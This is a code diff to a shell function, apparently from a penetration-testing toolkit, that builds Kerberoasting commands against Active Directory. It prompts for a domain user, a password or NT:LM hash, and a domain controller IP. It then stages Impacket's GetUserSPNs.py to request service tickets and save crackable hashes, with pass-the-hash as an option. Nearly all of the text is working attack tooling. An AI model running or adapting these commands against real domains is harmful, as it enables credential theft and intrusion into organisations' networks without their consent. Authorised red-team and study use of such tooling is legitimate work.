@@ -39,11 +39,27 @@ nb-ad-kerb-tcpdump() {
 }
 
 nb-ad-kerb-kerberoast() {
-    __ask "Enter target AD domain (must also be set in your hosts file)"
+    __check-project
     nb-vars-set-domain
-    __ask "Enter service user account"
+    __ask "Enter any domain user account"
     __check-user
     __ask "Enter the IP address of the target domain controller"
     nb-vars-set-rhost
-    print -z "GetUserSPNs.py -request ${__DOMAIN}/${__USER} -dc-ip ${__RHOST} -outputfile $(__domadpath)/kerberoast.txt"
+
+    __ask "Do you want to log in using a password or a hash? (p/h)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    if [[ $login == "p" ]]; then
+        echo
+        __ask "Enter a password for authentication"
+        nb-vars-set-pass
+        print -z "GetUserSPNs.py -request ${__DOMAIN}/${__USER}:${__PASS} -dc-ip ${__RHOST} -outputfile $(__domadpath)/kerberoast.txt"
+    elif [[ $login == "h" ]]; then
+        echo
+        __ask "Enter the NT:LM hash for authentication"
+        __check-hash
+        print -z "sudo GetUserSPNs.py -hashes ${__HASH} ${__DOMAIN}/${__USER} -outputfile $(__domadpath)/kerberoast.txt"
+    else
+        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
+    fi
 }
